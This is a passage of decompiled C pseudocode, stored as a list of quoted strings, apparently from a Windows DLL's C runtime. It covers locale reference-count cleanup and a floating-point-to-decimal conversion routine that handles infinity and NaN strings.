    "    v1 = *(volatile signed __int32 **)(a1 + 224);",
    "    if ( v1 )",
    "      _InterlockedAdd(v1, 0xFFFFFFFF);",
    "    v2 = *(volatile signed __int32 **)(a1 + 240);",
    "    if ( v2 )",
    "      _InterlockedAdd(v2, 0xFFFFFFFF);",
    "    v3 = *(volatile signed __int32 **)(a1 + 232);",
    "    if ( v3 )",
    "      _InterlockedAdd(v3, 0xFFFFFFFF);",
    "    v4 = *(volatile signed __int32 **)(a1 + 256);",
    "    if ( v4 )",
    "      _InterlockedAdd(v4, 0xFFFFFFFF);",
    "    v5 = (volatile signed __int32 **)(a1 + 56);",
    "    v6 = 6;",
    "    do",
    "    {",
    "      if ( *(v5 - 2) != (volatile signed __int32 *)&unk_18004B4A8 && *v5 )",
    "        _InterlockedAdd(*v5, 0xFFFFFFFF);",
    "      if ( *(v5 - 3) )",
    "      {",
    "        v7 = *(v5 - 1);",
    "        if ( v7 )",
    "          _InterlockedAdd(v7, 0xFFFFFFFF);",
    "      }",
    "      v5 += 4;",
    "      --v6;",
    "    }",
    "    while ( v6 );",
    "    sub_18002E804(*(_QWORD *)(a1 + 288));",
    "  }",
    "}",
    "",
    "",
    "__int64 sub_18002E8D4()",
    "{",
    "  __int64 v0; // rax",
    "  __int64 *v1; // rdi",
    "  __int64 v2; // rbx",
    "",
    "  v0 = sub_1800262FC();",
    "  v1 = (__int64 *)(v0 + 144);",
    "  if ( (*(_DWORD *)(v0 + 936) & dword_18004B5B0) == 0 || (v2 = *v1) == 0 )",
    "  {",
    "    sub_1800209E8(4);",
    "    v2 = sub_18002E944(v1, qword_18004DCA0[0]);",
    "    sub_180020A3C(4);",
    "    if ( !v2 )",
    "      sub_1800219B0();",
    "  }",
    "  return v2;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18002E944(__int64 *a1, __int64 a2)",
    "{",
    "  __int64 v3; // rbx",
    "",
    "  if ( !a2 || !a1 )",
    "    return 0;",
    "  v3 = *a1;",
    "  if ( *a1 != a2 )",
    "  {",
    "    *a1 = a2;",
    "    sub_18002E5A0(a2);",
    "    if ( v3 )",
    "    {",
    "      sub_18002E82C(v3);",
    "      if ( !*(_DWORD *)(v3 + 16) && (wchar_t **)v3 != &off_18004B340 )",
    "        sub_18002E62C(v3);",
    "    }",
    "  }",
    "  return a2;",
    "}",
    "",
    "",
    "bool __fastcall sub_18002E9AC(char *a1, char *a2, int a3, int a4, int a5)",
    "{",
    "  char *v7; // rbx",
    "  int v10; // eax",
    "  char v11; // cl",
    "  _BYTE *v12; // rax",
    "",
    "  v7 = a2;",
    "  if ( !a5 )",
    "    return *a2 >= 53;",
    "  sub_180028050();",
    "  if ( v10 )",
    "  {",
    "    if ( v10 == 512 )",
    "    {",
    "      v11 = 1;",
    "      if ( !a4 )",
    "        goto LABEL_19;",
    "      while ( *v7 == 48 )",
    "        ++v7;",
    "      if ( *v7 )",
    "      {",
    "LABEL_19:",
    "        if ( a3 != 45 )",
    "          return v11;",
    "      }",
    "    }",
    "    else",
    "    {",
    "      if ( v10 != 256 )",
    "        return 0;",
    "      v11 = 1;",
    "      if ( !a4 )",
    "        goto LABEL_27;",
    "      while ( *v7 == 48 )",
    "        ++v7;",
    "      if ( *v7 )",
    "      {",
    "LABEL_27:",
    "        if ( a3 == 45 )",
    "          return v11;",
    "      }",
    "    }",
    "    return 0;",
    "  }",
    "  v11 = 1;",
    "  if ( *v7 > 53 )",
    "    return v11;",
    "  if ( *v7 < 53 )",
    "    return 0;",
    "  v12 = v7 + 1;",
    "  if ( !a4 )",
    "    return v11;",
    "  while ( *v12 == 48 )",
    "    ++v12;",
    "  if ( *v12 )",
    "    return v11;",
    "  if ( v7 != a1 )",
    "    return *(v7 - 1) & 1;",
    "  return 0;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18002EA7C(_BYTE *a1, unsigned __int64 a2, int a3, __int64 a4, int a5, int a6, __int64 a7)",
    "{",
    "  unsigned int v9; // ebx",
    "  int v11; // eax",
    "  char *v12; // rcx",
    "  char *v13; // rbx",
    "  char *v14; // rdx",
    "  char v15; // al",
    "  __int64 v16; // r8",
    "",
    "  if ( !a1 || !a2 )",
    "    goto LABEL_2;",
    "  v11 = 0;",
    "  *a1 = 0;",
    "  if ( a3 > 0 )",
    "    v11 = a3;",
    "  if ( a2 <= v11 + 1 )",
    "  {",
    "    v9 = 34;",
    "    goto LABEL_3;",
    "  }",
    "  if ( !a4 )",
    "  {",
    "LABEL_2:",
    "    v9 = 22;",
    "LABEL_3:",
    "    *(_DWORD *)(a7 + 44) = v9;",
    "    *(_BYTE *)(a7 + 48) = 1;",
    "    sub_18001A598(0, 0, 0, 0, 0, a7);",
    "    return v9;",
    "  }",
    "  v12 = *(char **)(a4 + 8);",
    "  v13 = a1 + 1;",
    "  v14 = v12;",
    "  *a1 = 48;",
    "  while ( a3 > 0 )",
    "  {",
    "    v15 = *v14;",
    "    if ( *v14 )",
    "      ++v14;",
    "    else",
    "      v15 = 48;",
    "    *v13++ = v15;",
    "    --a3;",
    "  }",
    "  *v13 = 0;",
    "  if ( a3 >= 0 && sub_18002E9AC(v12, v14, *(_DWORD *)a4, a5, a6) )",
    "  {",
    "    while ( *--v13 == 57 )",
    "      *v13 = 48;",
    "    ++*v13;",
    "  }",
    "  if ( *a1 == 49 )",
    "  {",
    "    ++*(_DWORD *)(a4 + 4);",
    "  }",
    "  else",
    "  {",
    "    v16 = -1;",
    "    do",
    "      ++v16;",
    "    while ( a1[v16 + 1] );",
    "    sub_180036160(a1, a1 + 1, v16 + 1);",
    "  }",
    "  return 0;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18002EB8C(unsigned __int64 a1, int a2, int a3, __int64 a4, _BYTE *a5, __int64 a6)",
    "{",
    "  unsigned int v8; // r15d",
    "  __int64 v9; // rbx",
    "  int v10; // eax",
    "  const char *v11; // r8",
    "  int v12; // eax",
    "  int v13; // eax",
    "  int v14; // eax",
    "  int v15; // eax",
    "  unsigned __int64 v16; // rbx",
    "  unsigned int v17; // r12d",
    "  double v18; // xmm0_8",
    "  unsigned __int64 v19; // rbx",
    "  unsigned int v20; // edx",
    "  __int64 v21; // r8",
    "  unsigned int v22; // r11d",
    "  unsigned int v23; // r8d",
    "  int v24; // ebx",
    "  bool v25; // zf",
    "  int v26; // eax",
    "  int v27; // eax",
    "  unsigned int v28; // r14d",
    "  __int64 v29; // r10",
    "  __int64 v30; // rax",
    "  __int64 v31; // rcx",
    "  int v32; // r9d",
    "  unsigned int v33; // edx",
    "  __int64 v34; // rcx",
    "  unsigned int v35; // r12d",
    "  unsigned int v36; // r11d",
    "  unsigned int v37; // r8d",
    "  int v38; // ebx",
    "  int v39; // eax",
    "  int v40; // eax",
    "  __int64 v41; // r10",
    "  __int64 v42; // rax",
    "  __int64 v43; // rcx",
    "  int v44; // r9d",
    "  unsigned int v45; // edx",
    "  __int64 v46; // rcx",
    "  __int64 v47; // r8",
    "  int v48; // eax",
    "  int v49; // eax",
    "  __int64 v50; // rdi",
    "  unsigned __int64 v51; // r8",
    "  unsigned int v52; // eax",
    "  __int64 v53; // r10",
    "  __int64 v54; // r8",
    "  int v55; // r9d",
    "  unsigned int v56; // ecx",
    "  int v57; // eax",
    "  int v58; // eax",
    "  unsigned int v59; // eax",
    "  __int64 v60; // r10",
    "  __int64 v61; // r8",
    "  int v62; // r9d",
    "  unsigned int v63; // ecx",
    "  unsigned int v64; // eax",
    "  unsigned int v65; // ecx",
    "  int v66; // eax",
    "  __int64 v67; // rax",
    "  __int64 v68; // rdi",
    "  __int64 v69; // rcx",
    "  __int64 v70; // rsi",
    "  __int64 v71; // rbx",
    "  unsigned int v72; // r9d",
    "  unsigned __int64 v73; // r8",
    "  __int64 v74; // r10",
    "  __int64 v75; // r9",
    "  unsigned __int64 v76; // rcx",
    "  __int64 v77; // rbx",
    "  unsigned __int64 v78; // r8",
    "  __int64 v79; // r9",
    "  unsigned __int64 v80; // rcx",
    "  char v81; // al",
    "  _BYTE *v82; // rsi",
    "  _BYTE *v83; // rbx",
    "  unsigned __int64 v84; // r8",
    "  __int64 v85; // r9",
    "  unsigned __int64 v86; // r8",
    "  unsigned int v87; // ebx",
    "  unsigned int *p_Source; // rcx",
    "  unsigned int *v89; // rdx",
    "  __int64 v90; // r10",
    "  __int64 v91; // rsi",
    "  unsigned __int64 v92; // r11",
    "  unsigned int v93; // r8d",
    "  __int64 v94; // rdi",
    "  int v95; // eax",
    "  unsigned __int64 v96; // rdx",
    "  unsigned int v97; // eax",
    "  __int64 v98; // rdx",
    "  unsigned __int64 v99; // rcx",
    "  unsigned __int64 v100; // r8",
    "  int v101; // eax",
    "  unsigned int v102; // eax",
    "  unsigned __int64 v103; // r8",
    "  __int64 v104; // r9",
    "  unsigned __int64 v105; // rcx",
    "  int v106; // ecx",
    "  unsigned int v107; // eax",
    "  unsigned int v108; // edx",
    "  int v109; // eax",
    "  __int64 v110; // rdi",
    "  __int64 v111; // rcx",
    "  __int64 v112; // rsi",
    "  __int64 v113; // rbx",
    "  unsigned int v114; // r9d",
    "  unsigned __int64 v115; // r8",
    "  __int64 v116; // r10",
    "  __int64 v117; // r9",
    "  unsigned __int64 v118; // rcx",
    "  __int64 v119; // rbx",
    "  unsigned __int64 v120; // r8",
    "  __int64 v121; // r9",
    "  unsigned __int64 v122; // rcx",
    "  char v123; // al",
    "  unsigned int v124; // r11d",
    "  unsigned int *v125; // rcx",
    "  unsigned int *v126; // rdx",
    "  __int64 v127; // r10",
    "  __int64 v128; // rsi",
    "  unsigned __int64 v129; // rbx",
    "  unsigned int v130; // r8d",
    "  __int64 v131; // rdi",
    "  int v132; // eax",
    "  unsigned __int64 v133; // rdx",
    "  unsigned int v134; // eax",
    "  __int64 v135; // rdx",
    "  unsigned __int64 v136; // rcx",
    "  unsigned __int64 v137; // r8",
    "  unsigned int v138; // ecx",
    "  unsigned int v139; // eax",
    "  unsigned __int64 v140; // r8",
    "  __int64 v141; // r9",
    "  unsigned __int64 v142; // rcx",
    "  int v143; // eax",
    "  int v144; // edi",
    "  unsigned __int64 v145; // r8",
    "  __int64 v146; // r9",
    "  unsigned __int64 v147; // r8",
    "  unsigned int v148; // eax",
    "  __int64 v149; // rdi",
    "  _BYTE *v150; // rdi",
    "  char v151; // si",
    "  unsigned int v152; // r9d",
    "  unsigned __int64 v153; // r8",
    "  __int64 v154; // r10",
    "  unsigned __int64 v155; // rcx",
    "  unsigned int v156; // r8d",
    "  unsigned int i; // r9d",
    "  char v158; // cl",
    "  __int64 v159; // rax",
    "  unsigned int v161; // [rsp+30h] [rbp-D0h]",
    "  unsigned int v162; // [rsp+34h] [rbp-CCh]",
    "  unsigned int v163; // [rsp+34h] [rbp-CCh]",
    "  unsigned int v164; // [rsp+38h] [rbp-C8h]",
    "  unsigned int v165; // [rsp+38h] [rbp-C8h]",
    "  unsigned int *v166; // [rsp+40h] [rbp-C0h] BYREF",
    "  int v167; // [rsp+48h] [rbp-B8h]",
    "  unsigned __int64 v168; // [rsp+50h] [rbp-B0h]",
    "  unsigned int *v169; // [rsp+58h] [rbp-A8h]",
    "  unsigned int v170; // [rsp+60h] [rbp-A0h]",
    "  int v171; // [rsp+64h] [rbp-9Ch] BYREF",
    "  unsigned int v172; // [rsp+68h] [rbp-98h] BYREF",
    "  unsigned int v173; // [rsp+6Ch] [rbp-94h]",
    "  fenv_t Env; // [rsp+70h] [rbp-90h] BYREF",
    "  char v175; // [rsp+78h] [rbp-88h]",
    "  int v176; // [rsp+80h] [rbp-80h] BYREF",
    "  _BYTE *v177; // [rsp+88h] [rbp-78h]",
    "  unsigned int *v178; // [rsp+90h] [rbp-70h]",
    "  __int64 v179; // [rsp+98h] [rbp-68h]",
    "  unsigned int v180; // [rsp+A0h] [rbp-60h] BYREF",
    "  _DWORD Destination[115]; // [rsp+A4h] [rbp-5Ch] BYREF",
    "  unsigned int v182; // [rsp+270h] [rbp+170h] BYREF",
    "  _DWORD v183[115]; // [rsp+274h] [rbp+174h] BYREF",
    "  unsigned int v184; // [rsp+440h] [rbp+340h]",
    "  unsigned int Source; // [rsp+444h] [rbp+344h] BYREF",
    "  int v186; // [rsp+448h] [rbp+348h]",
    "  unsigned int v187; // [rsp+610h] [rbp+510h]",
    "  _DWORD v188[115]; // [rsp+614h] [rbp+514h] BYREF",
    "",
    "  v168 = a1;",
    "  v177 = a5;",
    "  v179 = a4;",
    "  v171 = a3;",
    "  fegetenv(&Env);",
    "  v8 = 1;",
    "  if ( (Env._Fe_ctl & 0x1F) == 0x1F )",
    "  {",
    "    v175 = 0;",
    "  }",
    "  else",
    "  {",
    "    sub_18003462C(&Env);",
    "    v175 = 1;",
    "  }",
    "  v9 = v168;",
    "  v10 = 32;",
    "  *(_QWORD *)(a4 + 8) = a5;",
    "  if ( v9 < 0 )",
    "    v10 = 45;",
    "  *(_DWORD *)a4 = v10;",
    "  sub_180034550(&v176, 0, 0);",
    "  if ( (((unsigned __int64)v9 >> 52) & 0x7FF) != 0 )",
    "  {",
    "    if ( (((unsigned __int64)v9 >> 52) & 0x7FF) != 0x7FF )",
    "      goto LABEL_28;",
    "    if ( (v9 & 0xFFFFFFFFFFFFFLL) != 0 )",
    "    {",
    "      if ( v9 < 0 && (v9 & 0xFFFFFFFFFFFFFLL) == 0x8000000000000LL )",
    "        v12 = 4;",
    "      else",
    "        v12 = ((((unsigned __int64)v9 >> 51) & 1) == 0) | 2;",
    "    }",
    "    else",
    "    {",
    "      v12 = 1;",
    "    }",
    "    *(_DWORD *)(a4 + 4) = 1;",
    "    v13 = v12 - 1;",
    "    if ( !v13 )",
    "    {",
    "      if ( !(unsigned int)sub_180023124(a5, a6, (__int64)\"1#INF\") )",
    "      {",
    "        v8 = 0;",
    "        goto LABEL_307;",
    "      }",
    "      goto LABEL_310;",
    "    }",
    "    v14 = v13 - 1;",
    "    if ( v14 )",
    "    {",
    "      v15 = v14 - 1;",
    "      if ( v15 )",
    "      {",
    "        if ( v15 != 1 )",
    "          goto LABEL_28;",
    "        v11 = \"1#IND\";",
    "      }",
    "      else",
    "      {",
    "        v11 = \"1#SNAN\";",
    "      }",
    "    }",
    "    else",
    "    {",
    "      v11 = \"1#QNAN\";",
    "    }",
    "LABEL_22:",
    "    if ( !(unsigned int)sub_180023124(a5, a6, (__int64)v11) )",
    "      goto LABEL_307;",
    "LABEL_310:",
    "    sub_18001A6B4();",
    "    JUMPOUT(0x18002FE19LL);",
    "  }",
    "  if ( (v9 & 0xFFFFFFFFFFFFFLL) == 0 || (v176 & 0x1000000) != 0 )",
    "  {",
    "    *(_DWORD *)(a4 + 4) = 0;",
    "    v11 = (const char *)&unk_180041C40;",
    "    goto LABEL_22;",
    "  }",
    "LABEL_28:",
    "  v168 = v9 & 0x7FFFFFFFFFFFFFFFLL;",
    "  v173 = 524319;",
    "  sub_180034550(&v172, 0, 0);",
    "  sub_180034550(&v166, 524319, v173);",
    "  v169 = (unsigned int *)v168;",
    "  v170 = a2 + 1;",
    "  v16 = (v168 & 0xFFFFFFFFFFFFFLL) + (-(__int64)(((v168 >> 52) & 0x7FF) != 0) & 0x10000000000000LL);",
    "  v17 = ((v168 >> 52) & 0x7FF) + 2 - (((v168 >> 52) & 0x7FF) != 0);",
    "  sub_180034740(-(__int64)((v168 >> 52) & 0x7FF));",
    "  v18 = sub_18003467C();",
    "  Destination[0] = v16;",
    "  v19 = HIDWORD(v16);",
    "  Destination[1] = v19;",
    "  v161 = (((int)v18 - 0x7FFFFFFF) & 0xFFFFFFFE) != 0 ? (int)v18 : 0;",
    "  v20 = ((_DWORD)v19 != 0) + 1;",
    "  v180 = v20;",
    "  if ( v17 < 0x434 )",
    "  {",
    "    if ( v17 != 54 )",
    "    {",
    "      v186 = 0x100000;",
    "      Source = 0;",
    "      v184 = 2;",
    "      if ( (_DWORD)v19 )",
    "      {",
    "        v47 = 0;",
    "        while ( *(&Source + v47) == Destination[v47] )",
    "        {",
    "          v47 = (unsigned int)(v47 + 1);",
    "          if ( (_DWORD)v47 == 2 )",
    "          {",
    "            LODWORD(v166) = 0;",
    "            v25 = !_BitScanReverse((unsigned int *)&v48, v19);",
    "            if ( v25 )",
    "              v49 = 0;",
    "            else",
    "              v49 = v48 + 1;",
    "            v28 = v20 + ((unsigned int)(32 - v49) < 2);",
    "            if ( v28 <= 0x73 )",
    "            {",
    "              v52 = v28 - 1;",
    "              if ( v28 )",
    "              {",
    "                while ( 1 )",
    "                {",
    "                  v53 = v52;",
    "                  v54 = v52 - 1;",
    "                  v55 = v52 >= v20 ? 0 : Destination[v52];",
    "                  v56 = (unsigned int)v54 >= v20 ? 0 : Destination[v54];",
    "                  --v52;",
    "                  Destination[v53] = (4 * v55) | (v56 >> 30);",
    "                  if ( (_DWORD)v54 == -1 )",
    "                    break;",
    "                  v20 = v180;",
    "                }",
    "              }",
    "            }",
    "            else",
    "            {",
    "              v28 = 0;",
    "            }",
    "            v180 = v28;",
    "            v50 = (1078 - v17) >> 5;",
    "            sub_1800368A0(&Source, 0, 4 * v50);",
    "            *(&Source + v50) = 1 << ((54 - v17) & 0x1F);",
    "            goto LABEL_82;",
    "          }",
    "        }",
    "      }",
    "    }",
    "    LODWORD(v166) = 0;",
    "    v25 = !_BitScanReverse((unsigned int *)&v57, *(_DWORD *)((char *)Destination + ((_DWORD)v19 != 0 ? 4 : 0)));",
    "    if ( v25 )",
    "      v58 = 0;",
    "    else",
    "      v58 = v57 + 1;",
    "    v28 = v20 + (v58 == 32);",
    "    if ( v28 <= 0x73 )",
    "    {",
    "      v59 = v28 - 1;",
    "      if ( v28 )",
    "      {",
    "        while ( 1 )",
    "        {",
    "          v60 = v59;",
    "          v61 = v59 - 1;",
    "          v62 = v59 >= v20 ? 0 : Destination[v59];",
    "          v63 = (unsigned int)v61 >= v20 ? 0 : Destination[v61];",
    "          --v59;",
    "          Destination[v60] = (2 * v62) | (v63 >> 31);",
    "          if ( (_DWORD)v61 == -1 )",
    "            break;",
    "          v20 = v180;",
    "        }",
    "      }",
    "    }",
    "    else",
    "    {",
    "      v28 = 0;",
    "    }",
    "    v180 = v28;",
    "    v50 = (1077 - v17) >> 5;",
    "    sub_1800368A0(&Source, 0, 4 * v50);",
    "    *(&Source + v50) = 1 << ((53 - v17) & 0x1F);",
    "LABEL_82:",
    "    v35 = v50 + 1;",
    "    v51 = 4LL * (unsigned int)(v50 + 1);",
    "    v184 = v50 + 1;",
    "    v182 = v50 + 1;",
    "    if ( v51 )",
    "    {",
    "      if ( v51 > 0x1CC )",
    "      {",
    "        sub_1800368A0(v183, 0, 460);",
    "        *(_DWORD *)sub_18001A80C() = 34;",
    "        invalid_parameter_noinfo();",
    "      }",
    "      else",
    "      {",
    "        sub_180036160(v183, &Source, v51);",
    "      }",
    "      v35 = v182;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    v186 = 0x100000;",
    "    Source = 0;",
    "    v184 = 2;",
    "    if ( (_DWORD)v19 )",
    "    {",
    "      v21 = 0;",
    "      while ( *(&Source + v21) == Destination[v21] )",
    "      {",
    "        v21 = (unsigned int)(v21 + 1);",
    "        if ( (_DWORD)v21 == 2 )",
    "        {",
    "          LODWORD(v166) = 0;",
    "          v22 = (v17 - 1074) & 0x1F;",
    "          v23 = (v17 - 1074) >> 5;",
    "          v24 = (1LL << (32 - ((v17 - 50) & 0x1F))) - 1;",
    "          v25 = !_BitScanReverse((unsigned int *)&v26, Destination[v20 - 1]);",
    "          if ( v25 )",
    "            v27 = 0;",
    "          else",
    "            v27 = v26 + 1;",
    "          if ( v20 + v23 > 0x73 || (v28 = v23 + v20 + (v22 > 32 - v27), v28 > 0x73) )",
    "          {",
    "            v28 = 0;",
    "          }",
    "          else",
    "          {",
    "            v29 = v28 - 1;",
    "            if ( (_DWORD)v29 != v23 - 1 )",
    "            {",
    "              while ( 1 )",
    "              {",
    "                v30 = (unsigned int)v29 - v23;",
    "                v31 = (unsigned int)(v30 - 1);",
    "                v32 = (unsigned int)v30 >= v20 ? 0 : Destination[v30];",
    "                v33 = (unsigned int)v31 >= v20 ? 0 : Destination[v31];",
    "                Destination[v29] = ((v24 & v32) << v22) | ((~v24 & v33) >> (32 - v22));",
    "                v29 = (unsigned int)(v29 - 1);",
    "                if ( (_DWORD)v29 == v23 - 1 )",
    "                  break;",
    "                v20 = v180;",
    "              }",
    "            }",
    "            v34 = 0;",
    "            if ( v23 )",
    "            {",
    "              do",
    "              {",
    "                Destination[v34] = 0;",
    "                v34 = (unsigned int)(v34 + 1);",
    "              }",
    "              while ( (_DWORD)v34 != v23 );",
    "            }",
    "          }",
    "          v180 = v28;",
    "          v35 = 1;",
    "          v182 = 1;",
    "          v183[0] = 4;",
    "          goto LABEL_111;",
    "        }",
    "      }",
    "    }",
    "    LODWORD(v166) = 0;",
    "    v36 = (v17 - 1075) & 0x1F;",
    "    v37 = (v17 - 1075) >> 5;",
    "    v38 = (1LL << (32 - ((v17 - 51) & 0x1F))) - 1;",
    "    v25 = !_BitScanReverse((unsigned int *)&v39, Destination[v20 - 1]);",
    "    if ( v25 )",
    "      v40 = 0;",
    "    else",
    "      v40 = v39 + 1;",
    "    if ( v20 + v37 > 0x73 || (v28 = v37 + v20 + (v36 > 32 - v40), v28 > 0x73) )",
    "    {",
    "      v28 = 0;",
    "    }",
    "    else",
    "    {",
    "      v41 = v28 - 1;",
    "      if ( (_DWORD)v41 != v37 - 1 )",
    "      {",
    "        while ( 1 )",
    "        {",
    "          v42 = (unsigned int)v41 - v37;",
    "          v43 = (unsigned int)(v42 - 1);",
    "          v44 = (unsigned int)v42 >= v20 ? 0 : Destination[v42];",
    "          v45 = (unsigned int)v43 >= v20 ? 0 : Destination[v43];",
    "          Destination[v41] = ((v38 & v44) << v36) | ((~v38 & v45) >> (32 - v36));",
    "          v41 = (unsigned int)(v41 - 1);",
    "          if ( (_DWORD)v41 == v37 - 1 )",
    "            break;",
    "          v20 = v180;",
    "        }",
    "      }",
    "      v46 = 0;",
    "      if ( v37 )",
    "      {",
    "        do",
    "        {",
    "          Destination[v46] = 0;",
    "          v46 = (unsigned int)(v46 + 1);",
    "        }",
    "        while ( (_DWORD)v46 != v37 );",
    "      }",
    "    }",
    "    v180 = v28;",
    "    v35 = 1;",
    "    v182 = 1;",
    "    v183[0] = 2;",
    "  }",
    "LABEL_111:",
    "  if ( (v161 & 0x80000000) == 0 )",
    "  {",
    "    v64 = v161 / 0xA;",
    "    LODWORD(v168) = v161 / 0xA;",
    "    v65 = v161 / 0xA;",
    "    v164 = v161 / 0xA;",
    "    if ( !(v161 / 0xA) )",
    "    {",
    "LABEL_183:",
    "      v101 = 10 * v64;",
    "      if ( v161 != v101 )",
    "      {",
    "        v102 = dword_18003C958[v161 - v101 - 1];",
    "        if ( !v102 )",
    "          goto LABEL_142;",
    "        if ( v102 != 1 && v35 )",
    "        {",
    "          LODWORD(v103) = 0;",
    "          v104 = 0;",
    "          do",
    "          {",
    "            v105 = (unsigned int)v103 + v102 * (unsigned __int64)(unsigned int)v183[v104];",
    "            v183[v104] = v105;",
    "            v103 = HIDWORD(v105);",
    "            v104 = (unsigned int)(v104 + 1);",
    "          }",
    "          while ( (_DWORD)v104 != v35 );",
    "          if ( HIDWORD(v105) )",
    "          {",
    "            if ( v182 >= 0x73 )",
    "              goto LABEL_142;",
    "            v183[v182] = HIDWORD(v105);",
    "            v35 = v182 + 1;",
    "            goto LABEL_143;",
    "          }",
    "          v35 = v182;",
    "        }",
    "      }",
    "LABEL_144:",
    "      v82 = v177;",
    "      v83 = v177;",
    "      if ( v28 )",
    "      {",
    "        LODWORD(v84) = 0;",
    "        v85 = 0;",
    "        do",
    "        {",
    "          v86 = (unsigned int)v84 + 10LL * (unsigned int)Destination[v85];",
    "          Destination[v85] = v86;",
    "          v85 = (unsigned int)(v85 + 1);",
    "          v84 = HIDWORD(v86);",
    "        }",
    "        while ( (_DWORD)v85 != v28 );",
    "        if ( (_DWORD)v84 )",
    "        {",
    "          if ( v180 >= 0x73 )",
    "          {",
    "            v184 = 0;",
    "            v180 = 0;",
    "            memcpy_s(Destination, 0x1CCu, &Source, 0);",
    "          }",
    "          else",
    "          {",
    "            Destination[v180++] = v84;",
    "          }",
    "        }",
    "      }",
    "      goto LABEL_268;",
    "    }",
    "    while ( 1 )",
    "    {",
    "      v66 = v65;",
    "      if ( v65 > 0x26 )",
    "        v66 = 38;",
    "      v167 = v66;",
    "      v67 = (unsigned int)(v66 - 1);",
    "      v68 = (unsigned int)v67;",
    "      v69 = (unsigned __int8)byte_18003C8C2[4 * v67];",
    "      v70 = (unsigned __int8)byte_18003C8C3[4 * v67];",
    "      v71 = 4 * v69;",
    "      v184 = v70 + v69;",
    "      sub_1800368A0(&Source, 0, 4 * v69);",
    "      sub_180036160(",
    "        (char *)&Source + v71,",
    "        (char *)&unk_18003BFB0 + 4 * (unsigned __int16)word_18003C8C0[2 * v68],",
    "        4 * v70);",
    "      v72 = v184;",
    "      if ( v184 > 1 )",
    "      {",
    "        if ( v35 > 1 )",
    "        {",
    "          v87 = v35;",
    "          p_Source = &Source;",
    "          if ( v184 < v35 )",
    "            v87 = v184;",
    "          else",
    "            p_Source = v183;",
    "          v169 = p_Source;",
    "          v162 = v87;",
    "          v89 = v183;",
    "          if ( v184 >= v35 )",
    "            v89 = &Source;",
    "          v166 = v89;",
    "          if ( v184 < v35 )",
    "            v72 = v35;",
    "          v35 = 0;",
    "          v90 = 0;",
    "          v187 = 0;",
    "          while ( 1 )",
    "          {",
    "            v91 = p_Source[v90];",
    "            if ( (_DWORD)v91 )",
    "            {",
    "              LODWORD(v92) = 0;",
    "              v93 = v90;",
    "              if ( v72 )",
    "              {",
    "                while ( v93 != 115 )",
    "                {",
    "                  v94 = v93;",
    "                  if ( v93 == v35 )",
    "                  {",
    "                    v188[v93] = 0;",
    "                    v187 = v93 + 1;",
    "                  }",
    "                  v95 = v93++;",
    "                  v96 = (unsigned int)v188[v94] + (unsigned int)v92 + v91 * v89[(unsigned int)(v95 - v90)];",
    "                  v188[v94] = v96;",
    "                  v35 = v187;",
    "                  v92 = HIDWORD(v96);",
    "                  if ( v93 - (_DWORD)v90 == v72 )",
    "                    break;",
    "                  v89 = v166;",
    "                }",
    "                if ( (_DWORD)v92 )",
    "                {",
    "                  while ( v93 != 115 )",
    "                  {",
    "                    v97 = v93 + 1;",
    "                    v98 = v93;",
    "                    v25 = v93++ == v35;",
    "                    if ( v25 )",
    "                    {",
    "                      v188[v98] = 0;",
    "                      v187 = v97;",
    "                    }",
    "                    v99 = (unsigned int)v188[v98] + (unsigned __int64)(unsigned int)v92;",
    "                    v188[v98] = v99;",
    "                    v35 = v187;",
    "                    LODWORD(v92) = HIDWORD(v99);",
    "                    if ( !HIDWORD(v99) )",
    "                      goto LABEL_172;",
    "                  }",
    "LABEL_142:",
    "                  v35 = 0;",
    "LABEL_143:",
    "                  v182 = v35;",
    "                  goto LABEL_144;",
    "                }",
    "LABEL_172:",
    "                v87 = v162;",
    "              }",
    "              if ( v93 == 115 )",
    "                goto LABEL_142;",
    "              p_Source = v169;",
    "              v89 = v166;",
    "            }",
    "            else if ( (_DWORD)v90 == v35 )",
    "            {",
    "              v188[v90] = 0;",
    "              v35 = v90 + 1;",
    "              v187 = v90 + 1;",
    "            }",
    "            v90 = (unsigned int)(v90 + 1);",
    "            if ( (_DWORD)v90 == v87 )",
    "            {",
    "              v100 = 4LL * v35;",
    "              v182 = v35;",
    "              if ( v100 )",
    "              {",
    "                if ( v100 > 0x1CC )",
    "                {",
    "                  sub_1800368A0(v183, 0, 460);",
    "                  *(_DWORD *)sub_18001A80C() = 34;",
    "                  invalid_parameter_noinfo();",
    "                }",
    "                else",
    "                {",
    "                  sub_180036160(v183, v188, v100);",
    "                }",
    "                v35 = v182;",
    "              }",
    "              goto LABEL_181;",
    "            }",
    "          }",
    "        }",
    "        v77 = v183[0];",
    "        v78 = 4LL * v184;",
    "        v35 = v184;",
    "        v182 = v184;",
    "        if ( v78 )",
    "        {",
    "          if ( v78 > 0x1CC )",
    "          {",
    "            sub_1800368A0(v183, 0, 460);",
    "            *(_DWORD *)sub_18001A80C() = 34;",
    "            invalid_parameter_noinfo();",
    "          }",
    "          else",
    "          {",
    "            sub_180036160(v183, &Source, v78);",
    "          }",
    "          v35 = v182;",
    "        }",
    "        if ( !(_DWORD)v77 )",
    "        {",
    "LABEL_117:",
    "          v35 = 0;",
    "          goto LABEL_137;",
    "        }",
    "        if ( (_DWORD)v77 == 1 || !v35 )",
    "          goto LABEL_140;",
    "        LODWORD(v73) = 0;",
    "        v79 = 0;",
    "        do",
    "        {",
    "          v80 = (unsigned int)v73 + v77 * (unsigned int)v183[v79];",
    "          v183[v79] = v80;",
    "          v73 = HIDWORD(v80);",
    "          v79 = (unsigned int)(v79 + 1);",
    "        }",
    "        while ( (_DWORD)v79 != v35 );",
    "      }",
    "      else",
    "      {",
    "        if ( !Source )",
    "          goto LABEL_117;",
    "        if ( Source == 1 || !v35 )",
    "          goto LABEL_140;",
    "        LODWORD(v73) = 0;",
    "        v74 = Source;",
    "        v75 = 0;",
    "        do",
    "        {",
    "          v76 = (unsigned int)v73 + v74 * (unsigned int)v183[v75];",
    "          v183[v75] = v76;",
    "          v73 = HIDWORD(v76);",
    "          v75 = (unsigned int)(v75 + 1);",
    "        }",
    "        while ( (_DWORD)v75 != v35 );",
    "      }",
    "      if ( !(_DWORD)v73 )",
    "        break;",
    "      if ( v182 < 0x73 )",
    "      {",
    "        v183[v182] = v73;",
    "        v35 = v182 + 1;",
    "LABEL_137:",
    "        v182 = v35;",
    "LABEL_140:",
    "        v81 = 1;",
    "        goto LABEL_141;",
    "      }",
    "      v35 = 0;",
